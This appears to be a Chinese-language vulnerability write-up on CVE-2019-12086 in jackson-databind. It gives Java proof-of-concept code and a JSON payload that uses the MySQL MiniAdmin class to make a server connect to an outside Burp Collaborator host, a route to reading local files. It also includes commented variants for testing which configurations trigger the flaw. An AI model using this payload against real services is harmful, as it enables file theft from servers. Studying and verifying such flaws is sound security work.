## CVE-2019-12086 jackson任意文件读取漏洞

参考：  
https://b1ue.cn/archives/189.html    
https://www.secbug.net/vulnerability/157.html（Jackson多态类型绑定方式说明）  
https://www.leadroyal.cn/?p=594（Jackson使用）  
https://github.com/c0d3p1ut0s/CVE-2019-12086-jackson-databind-file-read/blob/master/src/main/java/Main.java  

### 1. 漏洞说明

使用了jackson-databind 2.x before 2.9.9的Java应用，如果ClassPath中有com.mysql.cj.jdbc.admin.MiniAdmin（存在于MySQL的JDBC驱动中）这个类，那么Java应用所在的服务器上的文件，就可能被任意读取并传送到恶意的MySQL Server.  

### 2. 漏洞验证
此处仅是验证是否会远程连接。  

	/*
	 * CVE-2019-12086
	 */
	public static void cve201912086()
	{
	//		String payload="[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://jackson.gn78ew4lm9ktv0qgs9wfqs6tzk5bt0.burpcollaborator.net/jackson\"]";
		String payload="[\"com.mysql.jdbc.MiniAdmin\",\"jdbc:mysql://jackson.mysql.gn78ew4lm9ktv0qgs9wfqs6tzk5bt0.burpcollaborator.net/jackson\"]";

        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
	}
	//不同的写法，验证该漏洞，发现通过不同方式开启defaulttyping时，通过object.class进行反序列化时，会触发漏洞
	/*写法一：
	  ObjectMapper mapper = new ObjectMapper();
      mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
      Person p2 = (Person)mapper.readValue(param, Object.class);
	 */
	/*写法二：
	 ObjectMapper mapper = new ObjectMapper();
      mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
      Object p2 = mapper.readValue(param, Object.class);
	 */
	/*写法三：
	 ObjectMapper mapper = new ObjectMapper();
     Object p2 = mapper.readValue(param, Object.class);
	 */
	/*写法四：
	 ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
    String json = mapper.writeValueAsString(p);
    Person p2 = (Person)mapper.readValue(json, Person.class);
	 */
    /*写法五：
      ObjectMapper mapper = new ObjectMapper();
      mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
      Person p2 = (Person)mapper.readValue(param, Person.class);
     */
	/*写法六：
	 String payload="[\"com.mysql.jdbc.MiniAdmin\",\"jdbc:mysql://jackson.w96a9ag3g6t6ik7ze4057x08yz4pse.burpcollaborator.net/jackson\"]";
      ObjectMapper mapper = new ObjectMapper();
      mapper.enableDefaultTyping();
      try {
          mapper.readValue(payload, Object.class);
      } catch (IOException e) {
          e.printStackTrace();
      }

	 */

### 3. 验证POC
利用burpsuite开启collaborator功能，监听TCP和DNS解析访问结果：  

	[\"com.mysql.jdbc.MiniAdmin\",\"jdbc:mysql://jackson.mysql.gn78ew4lm9ktv0qgs9wfqs6tzk5bt0.burpcollaborator.net/jackson\"]